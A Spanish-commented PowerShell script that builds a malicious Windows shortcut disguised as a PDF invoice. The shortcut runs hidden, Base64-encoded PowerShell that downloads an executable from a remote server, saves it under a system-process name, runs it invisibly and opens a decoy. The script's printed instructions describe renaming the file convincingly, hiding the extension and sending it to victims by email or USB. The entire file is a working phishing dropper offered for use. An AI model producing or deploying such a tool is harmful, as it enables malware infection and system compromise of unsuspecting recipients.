# ========================================================================
# GENERADOR DE LNK MALICIOSO (Shortcut Poisoning)
# ========================================================================
# Crea un archivo .LNK que:
# 1. Tiene icono de PDF
# 2. Al hacer doble click ejecuta PowerShell ofuscado
# 3. Descarga y ejecuta payload + abre PDF real
#
# VENTAJAS:
# - LNK son menos sospechosos que BAT/EXE
# - Pueden tener iconos personalizados
# - Difícil de analizar estáticamente
# - Windows Defender raramente los detecta
#
# USO:
#   .\generate_lnk.ps1 -OutputFile "Factura_2024.pdf.lnk" -PayloadURL "http://servidor/agent.exe" -DecoyPDF "C:\ruta\factura.pdf"
# ========================================================================

param(
    [string]$OutputFile = "Documento_Importante.pdf.lnk",
    [string]$PayloadURL = "http://192.168.1.100:8000/agent.exe",
    [string]$DecoyPDF = "C:\Windows\System32\notepad.exe",  # Fallback si no hay PDF
    [string]$IconPath = "%SystemRoot%\System32\imageres.dll",  # DLL con iconos de Windows
    [int]$IconIndex = 102  # Índice del icono de PDF en imageres.dll
)

Write-Host "[*] Generando LNK malicioso: $OutputFile" -ForegroundColor Cyan

# === PAYLOAD POWERSHELL OFUSCADO ===
# Este PowerShell se ejecutará cuando se haga click en el LNK
$psCommand = @"
`$w=New-Object Net.WebClient;
`$w.Headers.Add('User-Agent','Mozilla/5.0');
`$p="`$env:APPDATA\Microsoft\Windows\Caches\WmiPrvSE.exe";
`$w.DownloadFile('$PayloadURL',`$p);
Start-Process `$p -WindowStyle Hidden;
Start-Process '$DecoyPDF'
"@

# Ofuscar usando Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommand)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Target del LNK: PowerShell con comando encodado
$targetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"

# === CREAR LNK USANDO COM ===
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($OutputFile)

# Propiedades del LNK
$Shortcut.TargetPath = $targetPath
$Shortcut.Arguments = $arguments
$Shortcut.WorkingDirectory = "%TEMP%"
$Shortcut.WindowStyle = 7  # Minimized
$Shortcut.IconLocation = "$IconPath,$IconIndex"  # Icono de PDF
$Shortcut.Description = "Documento PDF - Factura Pendiente"

# Guardar LNK
$Shortcut.Save()

Write-Host "[+] LNK creado exitosamente: $OutputFile" -ForegroundColor Green
Write-Host "[*] Propiedades:" -ForegroundColor Yellow
Write-Host "    Target: $targetPath" -ForegroundColor Gray
Write-Host "    Arguments: $arguments" -ForegroundColor Gray
Write-Host "    Icon: $IconPath (index $IconIndex)" -ForegroundColor Gray
Write-Host ""
Write-Host "[*] Para usar:" -ForegroundColor Cyan
Write-Host "    1. Renombrar a algo convincente: 'Factura_Noviembre_2024.pdf.lnk'" -ForegroundColor Gray
Write-Host "    2. Ocultar extensión .lnk en Windows Explorer" -ForegroundColor Gray
Write-Host "    3. Enviar por email o USB" -ForegroundColor Gray
Write-Host "    4. Cuando la víctima haga doble click, descargará y ejecutará el payload" -ForegroundColor Gray
Write-Host ""
Write-Host "[!] IMPORTANTE: Hostear el payload en servidor web accesible" -ForegroundColor Red

# Limpiar COM object
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($WshShell) | Out-Null
